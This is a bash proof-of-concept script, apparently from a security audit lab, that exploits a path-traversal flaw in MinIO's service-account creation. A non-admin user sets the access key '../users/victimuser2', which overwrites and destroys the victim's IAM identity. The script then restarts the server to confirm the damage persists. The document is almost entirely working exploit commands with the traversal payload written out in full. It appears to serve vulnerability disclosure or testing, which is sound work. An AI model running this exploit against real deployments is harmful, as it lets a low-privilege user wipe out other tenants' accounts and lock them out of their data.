#!/usr/bin/env bash
# F-02 — Cross-account IAM identity destruction via service-account access-key path traversal.
# A NON-ADMIN user creates a self service-account with key "../users/<victim>", which path.Clean-
# collapses onto the victim's identity object and destroys it (persists across an IAM reload).
# Prereq: setup/01-single-node.sh   (uses the exact-HEAD binary on :19000 if you want the reload
#         test; against a container, `docker restart minio-lab` performs the reload.)
set -euo pipefail
. "$(dirname "$0")/../../setup/env.sh"
T=${1:-$S1}   # target endpoint (default single node)

echo "=== setup: victim (with a policy) + attacker (non-admin, only s3 on its own bucket) ==="
mcsh '
mc alias set L '"$T"' '"$ROOT_USER"' '"$ROOT_PASS"' >/dev/null 2>&1
mc mb -p L/tenant-a >/dev/null 2>&1; printf "victim-data\n" | mc pipe L/tenant-a/o.txt >/dev/null 2>&1
cat > /tmp/ro.json <<POL
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject","s3:ListBucket"],"Resource":["arn:aws:s3:::tenant-a","arn:aws:s3:::tenant-a/*"]}]}
POL
cat > /tmp/atk.json <<POL
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject","s3:PutObject"],"Resource":["arn:aws:s3:::attacker-bkt/*"]}]}
POL
mc admin policy create L ro-a /tmp/ro.json >/dev/null 2>&1
mc admin user add L victimuser2 victimsecret123 >/dev/null 2>&1
mc admin policy attach L ro-a --user victimuser2 >/dev/null 2>&1
mc admin policy create L atk-pol /tmp/atk.json >/dev/null 2>&1
mc admin user add L attacker1 attackerpass123 >/dev/null 2>&1
mc admin policy attach L atk-pol --user attacker1 >/dev/null 2>&1
mc alias set V '"$T"' victimuser2 victimsecret123 >/dev/null 2>&1
mc alias set ATK '"$T"' attacker1 attackerpass123 >/dev/null 2>&1
printf "  [pre] victim reads own object : "; mc cat V/tenant-a/o.txt 2>&1 | tail -1
printf "  [pre] attacker is admin?      : "; mc admin info ATK >/dev/null 2>&1 && echo "ADMIN(unexpected)" || echo "non-admin (confirmed)"
echo "=== ATTACK: attacker creates a SELF svcacct with a traversal access key ==="
mc admin user svcacct add ATK attacker1 --access-key "../users/victimuser2" --secret-key evil12345 2>&1 | tail -2
'
echo
echo "=== reload IAM (restart) to force a load from disk, then check the victim ==="
if [ -x /tmp/minio-head-bin ] && [ "$T" = "$NODE_A" ]; then
  pkill -f "minio-head-bin server /tmp/dataA" 2>/dev/null || true; sleep 2
  MINIO_ROOT_USER="$ROOT_USER" MINIO_ROOT_PASSWORD="$ROOT_PASS" nohup /tmp/minio-head-bin server /tmp/dataA --address :19000 --console-address :19010 >/tmp/nodeA.log 2>&1 &
  sleep 6
else
  docker restart minio-lab >/dev/null 2>&1 || true; sleep 6
fi
mcsh '
mc alias set L '"$T"' '"$ROOT_USER"' '"$ROOT_PASS"' >/dev/null 2>&1
mc alias set V '"$T"' victimuser2 victimsecret123 >/dev/null 2>&1
printf "  [post-reload] victim reads with ORIGINAL secret : "; mc cat V/tenant-a/o.txt 2>&1 | tail -1
printf "  [post-reload] victimuser2 still in user list?   : "; mc admin user list L 2>&1 | tail -5 | tr "\n" " "; echo
'
echo
echo "VULNERABLE if: post-reload the victim can no longer authenticate (account destroyed / gone from list)."
